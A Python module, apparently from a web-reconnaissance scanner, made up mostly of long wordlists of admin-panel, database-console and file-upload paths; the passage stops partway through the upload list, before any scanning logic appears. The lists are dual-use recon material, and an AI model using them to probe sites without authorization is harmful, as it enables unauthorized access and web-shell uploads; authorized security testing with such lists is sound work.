import requests
from bs4 import BeautifulSoup
import os
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from .utils import (
    get_random_ua, print_info, print_success, print_warning, print_error,
    GREEN, YELLOW, RED, CYAN, RESET, print_banner
)

# Disable SSL warnings for cleaner output
requests.packages.urllib3.disable_warnings()

# -------------------- Extensive wordlists --------------------
ADMIN_PATHS = [
"admin", "login", "wp-admin", "administrator", "admin.php", "login.php",
"user/login", "admin/login", "admin_area", "adminpanel", "panel", "cpanel",
"wp-login.php", "admin/index.php", "admin/admin.php", "admin/login.php",
"user/login.php", "admin/", "login/", "administrator/index.php", "adminarea",
"admin/home.php", "admin/controlpanel", "admincp", "admin/account.php",
"admin/dashboard", "admin/backend", "moderator", "webadmin",
"admin/adminLogin.php", "admin/admin_login.php", "admin-login.php",
"bb-admin", "admin/home", "admin_area/admin.php", "admin_area/login.php",
"siteadmin/login.php", "siteadmin/index.php", "admin/authentication.php",
"admin/authentication.aspx", "admin/authentication.jsp", "admin/signin.php",
"login.aspx", "login.jsp", "admin/login.aspx", "admin/login.jsp",
"admin/index.jsp", "admin/index.aspx", "admin/account.aspx", "admin/account.jsp",
"admin/controlpanel.php", "admincp/index.php", "admincp/login.php",
"administrator/login.php", "admin/panel", "admin/adminpanel", "admin/signin",
"user/signin", "member/login", "members/login", "user/login.html",
"admin/login.html", "admin/index.html", "admin_area/index.php",
"admin_area/login.php", "admin_area/admin.php", "admin_area/index.html",
"admin_area/login.html", "admin/admin_login.html", "admin-login.html",
"administrator/login.html", "wp-admin/admin-ajax.php", "wp-admin/install.php",
"wp-admin/upgrade.php", "adminer.php", "adminer", "phpmyadmin", "pma",
"myadmin", "mysql", "sql", "dbadmin", "database", "db", "webadmin",
"admin/phpmyadmin", "admin/pma", "admin/mysql", "admin/db", "admin/sql",
"administrator/phpmyadmin", "administrator/pma", "adminer/index.php",
"adminer/login.php", "admin/phpmyadmin/index.php", "admin/pma/index.php",
"admin/mysql/index.php", "admin/db/index.php", "phpMyAdmin",
"phpmyadmin/index.php", "pma/index.php", "mysql/index.php", "sql/index.php",
"dbadmin/index.php", "database/index.php", "backoffice", "backend",
"dashboard", "manager", "management", "cp", "control", "controlpanel",
"sysadmin", "superuser", "superadmin", "root", "webmaster", "mod", "staff",
"staffonly", "private", "secure", "secret", "hidden", "administration",
"admin-console", "adminconsole", "admin_console", "admin-portal",
"adminportal", "admin-dashboard", "admindashboard", "admin-backend",
"adminbackend", "admin-control", "admincontrol", "admin-controlpanel",
"admincontrolpanel", "admin-cp", "admin-acp", "adminacp", "acp",
"administrator.php", "signin.php", "auth.php", "authenticate.php",
"user.php", "member.php", "admin/administration.php", "admin/administrator.php",
"admin/auth.php", "admin/authenticate.php", "admin/user.php",
"admin/member.php", "administrator/admin.php", "administrator/panel.php",
"administrator/dashboard.php", "administrator/controlpanel.php",
"administrator/backend.php", "administrator/backoffice.php",
"administrator/administration.php", "administrator/signin.php",
"administrator/auth.php", "administrator/authenticate.php",
"administrator/user.php", "administrator/member.php",
"wp-admin/setup-config.php", "wp-admin/options.php", "wp-admin/users.php",
"wp-admin/profile.php", "wp-admin/plugins.php", "wp-admin/themes.php",
"wp-admin/tools.php", "wp-admin/import.php", "wp-admin/export.php",
"wp-admin/customize.php", "wp-admin/widgets.php", "wp-admin/menu.php",
"wp-admin/network.php", "wp-admin/network/admin.php",
"wp-admin/network/settings.php", "wp-admin/network/users.php",
"wp-admin/network/plugins.php", "wp-admin/network/themes.php",
"wp-admin/ms-admin.php", "wp-admin/ms-sites.php", "wp-admin/ms-users.php",
"administrator/help.php", "administrator/cache.php", "administrator/backups.php",
"administrator/components.php", "administrator/modules.php",
"administrator/plugins.php", "administrator/templates.php",
"administrator/languages.php", "administrator/configuration.php",
"administrator/manage.php", "administrator/users.php", "administrator/menus.php",
"administrator/content.php", "administrator/articles.php",
"administrator/categories.php", "administrator/media.php",
"administrator/installer.php", "administrator/extension.php",
"administrator/update.php", "administrator/cpanel.php",
"user/register", "user/password", "user/logout", "admin/content",
"admin/structure", "admin/appearance", "admin/modules", "admin/config",
"admin/people", "admin/reports", "admin/help", "admin/toolbar", "admin/views",
"admin/settings", "admin/people/permissions", "admin/people/roles",
"admin/people/create", "admin/config/people", "admin/config/system",
"admin/config/development", "admin/config/media", "admin/config/content",
"admin/config/search", "admin/config/regional", "admin/config/services",
"admin/config/workflow", "admin/reports/dblog", "admin/reports/status",
"admin/reports/updates", "admin/reports/fields", "admin/reports/errors",
"admin/reports/access-denied", "admin/reports/page-not-found",
"admin/reports/security", "admin/reports/php", "index.php/admin",
"admin/index", "admin/sales", "admin/catalog", "admin/customer",
"admin/promo", "admin/newsletter", "admin/cms", "admin/report",
"admin/system", "admin/checkout", "admin/shipping", "admin/payment",
"admin/tax", "admin/currency", "admin/store", "admin/configuration",
"admin/cache", "admin/index/index/key/", "admin/admin/dashboard",
"admin/admin/login", "admin/admin/forgotpassword", "admin/admin/resetpassword",
"admin/admin/role", "admin/admin/user", "admin/admin/permissions",
"admin/admin/roles", "admin/admin/users", "admin/admin/integration",
"admin/admin/extension", "admin/admin/module", "admin/admin/theme",
"admin/admin/language", "admin/admin/store", "admin/admin/website",
"admin/admin/attribute", "admin/admin/category", "admin/admin/product",
"admin/admin/order", "admin/admin/invoice", "admin/admin/shipment",
"admin/admin/creditmemo", "admin/admin/customer", "admin/admin/review",
"admin/admin/tag", "admin/admin/poll", "admin/admin/newsletter",
"admin/admin/subscriber", "admin/admin/template", "admin/admin/email",
"admin/admin/cron", "admin/admin/backup", "admin/admin/restore",
"admin/admin/log", "admin/admin/error", "admin/admin/session",
"admin/admin/cache", "admin/admin/account", "admin/admin/profile",
"admin/admin/setting", "admin/admin/config", "admin/admin/configuration",
"admin/admin/tools", "admin/admin/utilities", "admin/admin/developer",
"admin/admin/import", "admin/admin/export", "admin/admin/update",
"admin/admin/upgrade", "admin/admin/install", "admin/admin/uninstall",
"admin/admin/license", "admin/admin/activation", "admin/admin/maintenance",
"admin/admin/optimization", "admin/admin/security", "admin/admin/firewall",
"admin/admin/monitor", "admin/admin/audit", "admin/admin/statistic",
"admin/admin/analytics", "admin/admin/tracking", "admin/admin/debug",
"admin/admin/performance", "admin/admin/speed", "admin/admin/compilation",
"admin/admin/storage", "admin/admin/media", "admin/admin/image",
"admin/admin/file", "admin/admin/attachment", "admin/admin/download",
"admin/admin/upload", "admin/admin/migrate", "admin/admin/sync",
"admin/admin/api", "admin/admin/soap", "admin/admin/rest",
"admin/admin/graphql", "admin/admin/oauth", "admin/admin/jwt",
"admin/admin/token", "admin/admin/cors", "admin/admin/csrf",
"admin/admin/xss", "admin/admin/sql", "admin/admin/injection",
"admin/admin/scanner", "admin/admin/cleaner", "admin/admin/optimizer",
"admin/admin/compressor", "admin/admin/minifier", "admin/admin/combiner",
"admin/admin/cdn", "admin/admin/cloudflare", "admin/admin/aws",
"admin/admin/google", "admin/admin/facebook", "admin/admin/twitter",
"admin/admin/linkedin", "admin/admin/instagram", "admin/admin/pinterest",
"admin/admin/youtube", "admin/admin/vimeo", "admin/admin/social",
"admin/admin/share", "admin/admin/like", "admin/admin/comment",
"admin/admin/rating", "admin/admin/review", "admin/admin/testimonial",
"admin/admin/faq", "admin/admin/support", "admin/admin/contact",
"admin/admin/feedback", "admin/admin/survey", "admin/admin/poll",
"admin/admin/vote", "admin/admin/quiz", "admin/admin/exam",
"admin/admin/course", "admin/admin/lesson", "admin/admin/tutorial",
"admin/admin/training", "admin/admin/education", "admin/admin/learning",
"admin/admin/knowledgebase", "admin/admin/wiki", "admin/admin/documentation",
"admin/admin/manual", "admin/admin/guide", "admin/admin/help",
"admin/admin/glossary", "admin/admin/sitemap", "admin/admin/robots",
"admin/admin/htaccess", "admin/admin/nginx", "admin/admin/apache",
"admin/admin/iis", "admin/admin/server", "admin/admin/hosting",
"admin/admin/domain", "admin/admin/dns", "admin/admin/email",
"admin/admin/ftp", "admin/admin/ssh", "admin/admin/sftp", "admin/admin/ssl",
"admin/admin/tls", "admin/admin/https", "admin/admin/certificate",
"admin/admin/key", "admin/admin/csr", "admin/admin/crt", "admin/admin/pem",
"admin/admin/p12", "admin/admin/jks", "admin/admin/keystore",
"admin/admin/truststore", "admin/admin/ca", "admin/admin/intermediate",
"admin/admin/chain", "admin/admin/bundle", "admin/admin/root",
"admin/admin/letsencrypt", "admin/admin/akamai", "admin/admin/fastly",
"admin/admin/edge", "admin/admin/origin", "admin/admin/pull",
"admin/admin/push", "admin/admin/invalidate", "admin/admin/purge",
"admin/admin/clear", "admin/admin/flush", "admin/admin/refresh",
"admin/admin/reload", "admin/admin/restart", "admin/admin/start",
"admin/admin/stop", "admin/admin/pause", "admin/admin/resume",
"admin/admin/status", "admin/admin/health", "admin/admin/check",
"admin/admin/alert", "admin/admin/notification", "admin/admin/push",
"admin/admin/webhook", "admin/admin/callback", "admin/admin/endpoint",
"admin/admin/rpc", "admin/admin/json", "admin/admin/xml", "admin/admin/csv",
"admin/admin/txt", "admin/admin/html", "admin/admin/css", "admin/admin/js",
"admin/admin/less", "admin/admin/sass", "admin/admin/scss",
"admin/admin/stylus", "admin/admin/coffee", "admin/admin/typescript",
"admin/admin/babel", "admin/admin/webpack", "admin/admin/gulp",
"admin/admin/grunt", "admin/admin/npm", "admin/admin/yarn",
"admin/admin/composer", "admin/admin/pip", "admin/admin/gem",
"admin/admin/bundle", "admin/admin/cargo", "admin/admin/go",
"admin/admin/rust", "admin/admin/python", "admin/admin/node",
"admin/admin/php", "admin/admin/ruby", "admin/admin/java",
"admin/admin/scala", "admin/admin/kotlin", "admin/admin/groovy",
"admin/admin/clojure", "admin/admin/elixir", "admin/admin/erlang",
"admin/admin/haskell", "admin/admin/lua", "admin/admin/perl",
"admin/admin/c", "admin/admin/cpp", "admin/admin/csharp",
"admin/admin/objc", "admin/admin/swift", "admin/admin/dart",
"admin/admin/flutter", "admin/admin/react", "admin/admin/vue",
"admin/admin/angular", "admin/admin/svelte", "admin/admin/ember",
"admin/admin/backbone", "admin/admin/jquery", "admin/admin/bootstrap",
"admin/admin/foundation", "admin/admin/materialize", "admin/admin/bulma",
"admin/admin/semantic", "admin/admin/tailwind", "admin/admin/spectre",
"admin/admin/milligram", "admin/admin/picnic", "admin/admin/kube",
"admin/admin/ink", "admin/admin/blueprint", "admin/admin/antd",
"admin/admin/element", "admin/admin/iview", "admin/admin/atui",
"admin/admin/zent", "forum/admin", "forum/admin.php", "forum/login.php",
"forum/administrator", "forum/moderator", "forum/admincp", "forum/acp",
"forum/modcp", "forum/mod", "forum/staff", "blog/admin", "blog/wp-admin",
"blog/wp-login.php", "blog/administrator", "blog/login", "shop/admin",
"shop/administrator", "shop/login", "shop/admin.php", "shop/login.php",
"store/admin", "store/administrator", "store/login", "store/admin.php",
"store/login.php", "cms/admin", "cms/administrator", "cms/login",
"cms/admin.php", "cms/login.php", "portal/admin", "portal/administrator",
"portal/login", "portal/admin.php", "portal/login.php", "user", "users",
"member", "members", "account", "accounts", "signin", "sign-up",
"register", "registration", "login.html", "signin.html", "admin.html",
"administrator.html", "phpinfo.php", "info.php", "test.php", "phpinfo",
"info", "test", "server-status", "server-info", "status", "cpanel", "whm",
"webmail", "plesk", "webmin", "usermin", "vesta", "vestacp", "ispconfig",
"ajenti", "ajaxplorer", "filemanager", "files", "fileadmin", "elfinder",
"ckfinder", "kcfinder", "tinymce", "fckeditor", "editor", "wysiwyg",
"phpmyadmin/scripts/setup.php", "phpmyadmin/setup", "pma/setup",
"myadmin/setup", "adminer/setup", "sqlite", "sqlite.php", "sqlite-admin",
"sqliteadmin", "phpPgAdmin", "phppgadmin", "pgmyadmin", "postgres",
"pgsql", "mongo-express", "rockmongo", "mongoadmin", "mongo", "couchdb",
"couchdb/_utils", "couchdb/_config", "redis", "redisadmin",
"phpRedisAdmin", "predis", "memcached", "memcache", "phpMemcachedAdmin",
"memadmin", "elasticsearch", "elasticsearch-head", "elasticsearch-kopf",
"kopf", "head", "rabbitmq", "rabbitmqadmin", "rabbitmq-management",
"management", "mq", "activemq", "kafka", "kafka-manager", "zookeeper",
"solr", "solr/admin", "solr/#/", "solr/index.html", "solr/cores",
"solr/collection1", "solr/admin/cores", "solr/admin/collections",
"solr/admin/configs", "solr/admin/plugins", "solr/admin/segments",
"solr/admin/replication", "solr/admin/distribution", "solr/admin/analysis",
"solr/admin/schema", "solr/admin/query", "solr/admin/update",
"solr/admin/get", "solr/admin/export", "solr/admin/import",
"solr/admin/backup", "solr/admin/restore", "solr/admin/rebalance",
"solr/admin/split", "solr/admin/merge", "solr/admin/alias",
"solr/admin/shard", "solr/admin/replica", "solr/admin/leader",
"solr/admin/follower", "solr/admin/overseer", "solr/admin/cluster",
"solr/admin/node", "solr/admin/logging", "solr/admin/metrics",
"solr/admin/health", "solr/admin/threads", "solr/admin/properties",
"solr/admin/system", "solr/admin/zookeeper"
]

UPLOAD_PATHS = [
    "upload",
    "uploads",
    "upload.php",
    "upload.asp",
    "upload.aspx",
    "upload.jsp",
    "upload.do",
    "upload.action",
    "upload.cgi",
    "upload.pl",
    "upload.py",
    "upload.rb",
    "upload.go",
    "upload.js",
    "upload.cshtml",
    "upload.ashx",
    "upload.cfm",
    "upload.cfc",
    "file-upload",
    "file_upload",
    "file-upload.php",
    "file_upload.php",
    "file-upload.asp",
    "file-upload.aspx",
    "file-upload.jsp",
    "file-upload.do",
    "file-upload.action",
    "file-upload.cgi",
    "file-upload.pl",
    "file-upload.py",
    "file-upload.rb",
    "file-upload.go",
    "file-upload.js",
    "uploader",
    "uploader.php",
    "uploader.asp",
    "uploader.aspx",
    "uploader.jsp",
    "uploader.do",
    "uploader.action",
    "uploader.cgi",
    "uploader.pl",
    "uploader.py",
    "uploader.rb",
    "uploader.go",
    "uploader.js",
    "upload-handler",
    "upload-handler.php",
    "upload-handler.asp",
    "upload-handler.aspx",
    "upload-handler.jsp",
    "upload-handler.do",
    "upload-handler.action",
    "upload-handler.cgi",
    "upload-handler.pl",
    "upload-handler.py",
    "upload-handler.rb",
    "upload-handler.go",
    "upload-handler.js",
    "upload-file",
    "upload-file.php",
    "upload-file.asp",
    "upload-file.aspx",
    "upload-file.jsp",
    "upload-file.do",
    "upload-file.action",
    "upload-file.cgi",
    "upload-file.pl",
    "upload-file.py",
    "upload-file.rb",
    "upload-file.go",
    "upload-file.js",
    "uploadimage",
    "uploadimage.php",
    "uploadimage.asp",
    "uploadimage.aspx",
    "uploadimage.jsp",
    "uploadimage.do",
    "uploadimage.action",
    "uploadimage.cgi",
    "uploadimage.pl",
    "uploadimage.py",
    "uploadimage.rb",
    "uploadimage.go",
    "uploadimage.js",
    "uploadimg",
    "uploadimg.php",
    "uploadimg.asp",
    "uploadimg.aspx",
    "uploadimg.jsp",
    "uploadimg.do",
    "uploadimg.action",
    "uploadimg.cgi",
    "uploadimg.pl",
    "uploadimg.py",
    "uploadimg.rb",
    "uploadimg.go",
    "uploadimg.js",
    "upload-image",
    "upload-image.php",
    "upload-image.asp",
    "upload-image.aspx",
    "upload-image.jsp",
    "upload-image.do",
    "upload-image.action",
    "upload-image.cgi",
    "upload-image.pl",
    "upload-image.py",
    "upload-image.rb",
    "upload-image.go",
    "upload-image.js",
    "fileupload",
    "fileupload.php",
    "fileupload.asp",
    "fileupload.aspx",
    "fileupload.jsp",
    "fileupload.do",
    "fileupload.action",
    "fileupload.cgi",
    "fileupload.pl",
    "fileupload.py",
    "fileupload.rb",
    "fileupload.go",
    "fileupload.js",
    "fileUpload",
    "fileUpload.php",
    "fileUpload.asp",
    "fileUpload.aspx",
    "fileUpload.jsp",
    "fileUpload.do",
    "fileUpload.action",
    "fileUpload.cgi",
    "fileUpload.pl",
    "fileUpload.py",
    "fileUpload.rb",
    "fileUpload.go",
    "fileUpload.js",
    "file_uploader",
    "file_uploader.php",
    "file_uploader.asp",
    "file_uploader.aspx",
    "file_uploader.jsp",
    "file_uploader.do",
    "file_uploader.action",
    "file_uploader.cgi",
    "file_uploader.pl",
    "file_uploader.py",
    "file_uploader.rb",
    "file_uploader.go",
    "file_uploader.js",
    "file-uploader",
    "file-uploader.php",
    "file-uploader.asp",
    "file-uploader.aspx",
    "file-uploader.jsp",
    "file-uploader.do",
    "file-uploader.action",
    "file-uploader.cgi",
    "file-uploader.pl",
    "file-uploader.py",
    "file-uploader.rb",
    "file-uploader.go",
    "file-uploader.js",
    "media-upload",
    "media_upload",
    "media-upload.php",
    "media_upload.php",
    "media-upload.asp",
    "media-upload.aspx",
    "media-upload.jsp",
    "media-upload.do",
    "media-upload.action",
    "media-upload.cgi",
    "media-upload.pl",
    "media-upload.py",
    "media-upload.rb",
    "media-upload.go",
    "media-upload.js",
    "media-uploader",
    "media_uploader",
    "media-uploader.php",
    "media_uploader.php",
    "media-uploader.asp",
    "media-uploader.aspx",
    "media-uploader.jsp",
    "media-uploader.do",
    "media-uploader.action",
    "media-uploader.cgi",
    "media-uploader.pl",
    "media-uploader.py",
    "media-uploader.rb",
    "media-uploader.go",
    "media-uploader.js",
    "image-upload",
    "image_upload",
    "image-upload.php",
    "image_upload.php",
    "image-upload.asp",
    "image-upload.aspx",
    "image-upload.jsp",
    "image-upload.do",
    "image-upload.action",
    "image-upload.cgi",
    "image-upload.pl",
    "image-upload.py",
    "image-upload.rb",
    "image-upload.go",
    "image-upload.js",
    "img-upload",
    "img_upload",
    "img-upload.php",
    "img_upload.php",
    "img-upload.asp",
    "img-upload.aspx",
    "img-upload.jsp",
    "img-upload.do",
    "img-upload.action",
    "img-upload.cgi",
    "img-upload.pl",
    "img-upload.py",
    "img-upload.rb",
    "img-upload.go",
    "img-upload.js",
    "pic-upload",
    "pic_upload",
    "pic-upload.php",
    "pic_upload.php",
    "pic-upload.asp",
    "pic-upload.aspx",
    "pic-upload.jsp",
    "pic-upload.do",
    "pic-upload.action",
    "pic-upload.cgi",
    "pic-upload.pl",
    "pic-upload.py",
    "pic-upload.rb",
    "pic-upload.go",
    "pic-upload.js",
    "photo-upload",
    "photo_upload",
    "photo-upload.php",
    "photo_upload.php",
    "photo-upload.asp",
    "photo-upload.aspx",
    "photo-upload.jsp",
    "photo-upload.do",
    "photo-upload.action",
    "photo-upload.cgi",
    "photo-upload.pl",
    "photo-upload.py",
    "photo-upload.rb",
    "photo-upload.go",
    "photo-upload.js",
    "picture-upload",
    "picture_upload",
    "picture-upload.php",
    "picture_upload.php",
    "picture-upload.asp",
    "picture-upload.aspx",
    "picture-upload.jsp",
    "picture-upload.do",
    "picture-upload.action",
    "picture-upload.cgi",
    "picture-upload.pl",
    "picture-upload.py",
    "picture-upload.rb",
    "picture-upload.go",
    "picture-upload.js",
    "avatar-upload",
    "avatar_upload",
    "avatar-upload.php",
    "avatar_upload.php",
    "avatar-upload.asp",
    "avatar-upload.aspx",
    "avatar-upload.jsp",
    "avatar-upload.do",
    "avatar-upload.action",
    "avatar-upload.cgi",
    "avatar-upload.pl",
    "avatar-upload.py",
    "avatar-upload.rb",
    "avatar-upload.go",
    "avatar-upload.js",
    "profile-upload",
    "profile_upload",
    "profile-upload.php",
    "profile_upload.php",
    "profile-upload.asp",
    "profile-upload.aspx",
    "profile-upload.jsp",
    "profile-upload.do",
    "profile-upload.action",
    "profile-upload.cgi",
    "profile-upload.pl",
    "profile-upload.py",
    "profile-upload.rb",
    "profile-upload.go",
    "profile-upload.js",
    "cover-upload",
    "cover_upload",
    "cover-upload.php",
    "cover_upload.php",
    "cover-upload.asp",
    "cover-upload.aspx",
    "cover-upload.jsp",
    "cover-upload.do",
    "cover-upload.action",
    "cover-upload.cgi",
    "cover-upload.pl",
    "cover-upload.py",
    "cover-upload.rb",
    "cover-upload.go",
    "cover-upload.js",
    "banner-upload",
    "banner_upload",
    "banner-upload.php",
    "banner_upload.php",
    "banner-upload.asp",
    "banner-upload.aspx",
    "banner-upload.jsp",
    "banner-upload.do",
    "banner-upload.action",
    "banner-upload.cgi",
    "banner-upload.pl",
    "banner-upload.py",
    "banner-upload.rb",
    "banner-upload.go",
    "banner-upload.js",
    "logo-upload",
    "logo_upload",
    "logo-upload.php",
    "logo_upload.php",
    "logo-upload.asp",
    "logo-upload.aspx",
    "logo-upload.jsp",
    "logo-upload.do",
    "logo-upload.action",
    "logo-upload.cgi",
    "logo-upload.pl",
    "logo-upload.py",
    "logo-upload.rb",
    "logo-upload.go",
    "logo-upload.js",
    "icon-upload",
    "icon_upload",
    "icon-upload.php",
    "icon_upload.php",
    "icon-upload.asp",
    "icon-upload.aspx",
    "icon-upload.jsp",
    "icon-upload.do",
    "icon-upload.action",
    "icon-upload.cgi",
    "icon-upload.pl",
    "icon-upload.py",
    "icon-upload.rb",
    "icon-upload.go",
    "icon-upload.js",
    "thumbnail-upload",
    "thumbnail_upload",
    "thumbnail-upload.php",
    "thumbnail_upload.php",
    "thumbnail-upload.asp",
    "thumbnail-upload.aspx",
    "thumbnail-upload.jsp",
    "thumbnail-upload.do",
    "thumbnail-upload.action",
    "thumbnail-upload.cgi",
    "thumbnail-upload.pl",
    "thumbnail-upload.py",
    "thumbnail-upload.rb",
    "thumbnail-upload.go",
    "thumbnail-upload.js",
    "attachment-upload",
    "attachment_upload",
    "attachment-upload.php",
    "attachment_upload.php",
    "attachment-upload.asp",
    "attachment-upload.aspx",
    "attachment-upload.jsp",
    "attachment-upload.do",
    "attachment-upload.action",
    "attachment-upload.cgi",
    "attachment-upload.pl",
    "attachment-upload.py",
    "attachment-upload.rb",
    "attachment-upload.go",
    "attachment-upload.js",
    "document-upload",
    "document_upload",
    "document-upload.php",
    "document_upload.php",
    "document-upload.asp",
    "document-upload.aspx",
    "document-upload.jsp",
    "document-upload.do",
    "document-upload.action",
    "document-upload.cgi",
    "document-upload.pl",
    "document-upload.py",
    "document-upload.rb",
    "document-upload.go",
    "document-upload.js",
    "file-upload-handler",
    "file_upload_handler",
    "file-upload-handler.php",
    "file_upload_handler.php",
    "file-upload-handler.asp",
    "file-upload-handler.aspx",
    "file-upload-handler.jsp",
    "file-upload-handler.do",
    "file-upload-handler.action",
    "file-upload-handler.cgi",
    "file-upload-handler.pl",
    "file-upload-handler.py",
    "file-upload-handler.rb",
    "file-upload-handler.go",
    "file-upload-handler.js",
    "upload-file-handler",
    "upload_file_handler",
    "upload-file-handler.php",
    "upload_file_handler.php",
    "upload-file-handler.asp",
    "upload-file-handler.aspx",
    "upload-file-handler.jsp",
    "upload-file-handler.do",
    "upload-file-handler.action",
    "upload-file-handler.cgi",
    "upload-file-handler.pl",
    "upload-file-handler.py",
    "upload-file-handler.rb",
    "upload-file-handler.go",
    "upload-file-handler.js",
    "upload-process",
    "upload_process",
    "upload-process.php",
    "upload_process.php",
    "upload-process.asp",
    "upload-process.aspx",
    "upload-process.jsp",
    "upload-process.do",
    "upload-process.action",
    "upload-process.cgi",
    "upload-process.pl",
    "upload-process.py",
    "upload-process.rb",
    "upload-process.go",
    "upload-process.js",
    "upload-progress",
    "upload_progress",
    "upload-progress.php",
    "upload_progress.php",
    "upload-progress.asp",
    "upload-progress.aspx",
    "upload-progress.jsp",
    "upload-progress.do",
    "upload-progress.action",
    "upload-progress.cgi",
    "upload-progress.pl",
    "upload-progress.py",
    "upload-progress.rb",
    "upload-progress.go",
    "upload-progress.js",
    "upload-receiver",
    "upload_receiver",
    "upload-receiver.php",
    "upload_receiver.php",
    "upload-receiver.asp",
    "upload-receiver.aspx",
    "upload-receiver.jsp",
    "upload-receiver.do",
    "upload-receiver.action",
    "upload-receiver.cgi",
    "upload-receiver.pl",
    "upload-receiver.py",
    "upload-receiver.rb",
    "upload-receiver.go",
    "upload-receiver.js",
    "upload-acceptor",
    "upload_acceptor",
    "upload-acceptor.php",
    "upload_acceptor.php",
    "upload-acceptor.asp",
    "upload-acceptor.aspx",
    "upload-acceptor.jsp",
    "upload-acceptor.do",
    "upload-acceptor.action",
    "upload-acceptor.cgi",
    "upload-acceptor.pl",
    "upload-acceptor.py",
    "upload-acceptor.rb",
    "upload-acceptor.go",
    "upload-acceptor.js",
    "ajax-upload",
    "ajax_upload",
    "ajax-upload.php",
    "ajax_upload.php",
    "ajax-upload.asp",
    "ajax-upload.aspx",
    "ajax-upload.jsp",
    "ajax-upload.do",
    "ajax-upload.action",
    "ajax-upload.cgi",
    "ajax-upload.pl",
    "ajax-upload.py",
    "ajax-upload.rb",
    "ajax-upload.go",
    "ajax-upload.js",
    "upload-ajax",
    "upload_ajax",
    "upload-ajax.php",
    "upload_ajax.php",
    "upload-ajax.asp",
    "upload-ajax.aspx",
    "upload-ajax.jsp",
    "upload-ajax.do",
    "upload-ajax.action",
    "upload-ajax.cgi",
    "upload-ajax.pl",
    "upload-ajax.py",
    "upload-ajax.rb",
    "upload-ajax.go",
    "upload-ajax.js",
    "tmp-upload",
    "tmp_upload",
    "tmp-upload.php",
    "tmp_upload.php",
    "tmp-upload.asp",
    "tmp-upload.aspx",
    "tmp-upload.jsp",
    "tmp-upload.do",
    "tmp-upload.action",
    "tmp-upload.cgi",
    "tmp-upload.pl",
    "tmp-upload.py",
    "tmp-upload.rb",
    "tmp-upload.go",
    "tmp-upload.js",
    "temp-upload",
    "temp_upload",
    "temp-upload.php",
    "temp_upload.php",
    "temp-upload.asp",
    "temp-upload.aspx",
    "temp-upload.jsp",
    "temp-upload.do",
    "temp-upload.action",
    "temp-upload.cgi",
    "temp-upload.pl",
    "temp-upload.py",
    "temp-upload.rb",
    "temp-upload.go",
    "temp-upload.js",
    "temp",
    "tmp",
    "files",
    "media",
    "assets",
    "images",
    "img",
    "pictures",
    "photos",
    "documents",
    "attachments",
    "downloads",
    "user_uploads",
    "profile_uploads",
    "avatar_uploads",
    "gallery",
    "albums",
    "pics",
    "uploaded",
    "uploaded_files",
    "uploaded_images",
    "uploaded_media",
    "uploaded_docs",
    "uploaded_attachments",
    "tmp_uploads",
    "temp_uploads",
    "uploads/files",
    "uploads/images",
    "uploads/media",
    "uploads/documents",
    "uploads/attachments",
    "uploads/temp",
    "uploads/tmp",
    "files/upload",
    "images/upload",
    "media/upload",
    "assets/upload",
    "public/upload",
    "static/upload",
    "content/upload",
    "data/upload",
    "userdata/upload",
    "site/upload",
    "website/upload",
    "web/upload",
    "app/upload",
    "application/upload",
    "system/upload",
    "backend/upload",
    "frontend/upload",
    "api/upload",
    "api/v1/upload",
    "api/v2/upload",
    "api/file-upload",
    "api/media-upload",
    "api/image-upload",
    "api/document-upload",
    "api/attachment-upload",
    "rest/upload",
    "service/upload",
    "ws/upload",
    "endpoint/upload",
    "upload/api",
    "file/upload/api",
    "mobile/upload",
    "app/upload",
    "user/upload",
    "profile/upload",
    "account/upload",
    "my/upload",
    "admin/upload",
    "admin/uploads",
    "admin/file-upload",
    "admin/file_upload",
    "admin/media-upload",
    "admin/media_upload",
    "admin/uploader",
    "admin/uploader.php",
    "admin/upload-handler",
    "admin/upload-handler.php",
    "admin/upload-file",
    "admin/upload-file.php",
    "admin/upload-image",
    "admin/upload-image.php",
    "admin/upload-process",
    "admin/upload-process.php",
    "admin/ajax-upload",
    "admin/ajax_upload",
    "administrator/upload",
    "administrator/uploads",
    "backend/upload",
    "backend/uploads",
    "cms/upload",
    "cms/uploads",
    "cms/file-upload",
    "cms/media-upload",
    "wp-admin/upload",
    "wp-admin/async-upload.php",
    "wp-admin/media-new.php",
    "wp-admin/media-upload.php",
    "wp-admin/admin-ajax.php?action=upload-attachment",
    "wp-admin/admin-ajax.php?action=upload",
    "wp-content/uploads",
    "uploadify",
    "uploadify/upload.php",
    "uploadify/uploadify.php",
    "plupload",
    "plupload/upload.php",
    "plupload/upload.pl",
    "plupload/upload.py",
    "plupload/upload.rb",
    "plupload/upload.jsp",
    "plupload/upload.asp",
    "plupload/upload.aspx",
    "fineuploader",
    "fineuploader/upload.php",
    "fineuploader/endpoint.php",
    "jquery-file-upload",
    "jquery-file-upload/server/php/",
    "jquery-file-upload/server/php/index.php",
    "jquery-file-upload/server/php/upload.php",
    "blueimp",
    "blueimp/server/php/",
    "blueimp/server/php/index.php",
    "blueimp/server/php/upload.php",
    "ckeditor/plugins/fileupload",
    "ckfinder",
    "ckfinder/core/connector/php/connector.php",
    "ckfinder/connector",
    "ckfinder/connector.php",
    "tinymce/plugins/filemanager",
    "tinymce/plugins/filemanager/upload.php",
    "summernote/plugin/file-upload",
    "summernote/plugin/file-upload.php",
    "redactor/upload",
    "redactor/upload.php",
    "froala/upload",
    "froala/upload.php",
    "quill/upload",
    "quill/upload.php",
    "forum/upload",
    "forum/upload.php",
    "forum/attachment.php",
    "forum/attach.php",
    "forum/file-upload",
    "forum/upload-attachment",
    "phpBB/download/file.php?mode=upload",
    "phpBB/posting.php?mode=attach",
    "vBulletin/attachment.php",
    "vBulletin/upload.php",
    "xenforo/attachment",
    "xenforo/attachments",
    "SMF/index.php?action=upload",
    "SMF/index.php?action=attach",
    "wiki/upload",
    "wiki/index.php?title=Special:Upload",
    "mediawiki/upload",
    "mediawiki/index.php?title=Special:Upload",
    "doku.php?do=upload",
    "dokuwiki/lib/exe/mediamanager.php",
    "dokuwiki/lib/exe/upload.php",
    "shop/upload",
    "shop/file-upload",
    "store/upload",
    "store/file-upload",
    "cart/upload",
    "checkout/upload",
    "product/upload",
    "product-image-upload",
    "product-upload",
    "product-photo-upload",
    "dms/upload",
    "document/upload",
    "doc/upload",
    "docs/upload",
    "documents/upload",
    "file/upload",
    "files/upload",
    "hrm/upload",
    "employee/upload",
    "resume/upload",
    "cv/upload",
    "application/upload",
    "crm/upload",
    "customer/upload",
    "lead/upload",
    "contact/upload",
    "project/upload",
    "task/upload",
    "issue/upload",
    "bug/upload",
    "ticket/upload",
    "support/upload",
    "helpdesk/upload",
    "knowledgebase/upload",
    "education/upload",
